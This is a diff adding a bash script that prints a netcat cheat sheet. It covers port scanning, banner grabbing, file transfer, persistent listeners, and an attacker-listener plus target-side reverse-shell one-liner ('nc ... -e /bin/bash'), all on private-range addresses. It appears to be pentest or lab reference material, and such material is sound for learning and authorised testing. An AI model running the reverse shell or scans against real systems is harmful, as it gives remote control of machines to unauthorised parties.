@@ -1,0 +1,30 @@
+#!/bin/bash
+echo -e "\033[32m╔══════════════════════════════════════╗"
+echo -e "║  🔌 Netcat — Network Swiss Army Knife║"
+echo -e "╚══════════════════════════════════════╝\033[0m"
+echo
+echo -e "\033[33mWhy use it:\033[0m Read/write raw TCP/UDP connections —"
+echo "  port scan, banner grab, file transfer, reverse shell, listener."
+echo "  No tool does more with fewer bytes."
+echo
+echo -e "\033[33mPort scan (top 1000):\033[0m"
+echo "  nc -zv 192.168.50.1 1-1000          # TCP connect scan"
+echo "  nc -zvu 192.168.50.1 1-1000         # UDP scan (unreliable)"
+echo
+echo -e "\033[33mBanner grab:\033[0m"
+echo "  nc 192.168.50.1 80                  # then type: GET / HTTP/1.0"
+echo "  echo -e 'HEAD / HTTP/1.0\r\n\r' | nc 192.168.50.1 80"
+echo
+echo -e "\033[33mListener + reverse shell:\033[0m"
+echo "  # Attacker (listen):   nc -lnvp 4444"
+echo "  # Target (connect):    nc 192.168.50.10 4444 -e /bin/bash"
+echo
+echo -e "\033[33mFile transfer:\033[0m"
+echo "  # Receiver:  nc -lnvp 4444 > file.txt"
+echo "  # Sender:    nc 192.168.50.10 4444 < file.txt"
+echo
+echo -e "\033[33mPersistent listener (keep alive):\033[0m"
+echo "  nc -l -k -p 8080                    # -k = keep listening after disconnect"
+echo
+echo -e "\033[33mKey flags:\033[0m  -l listen · -v verbose · -n no DNS · -p port · -z zero-IO (scan)"
+echo -e "\033[90m──────────────────────────────────────\033[0m"
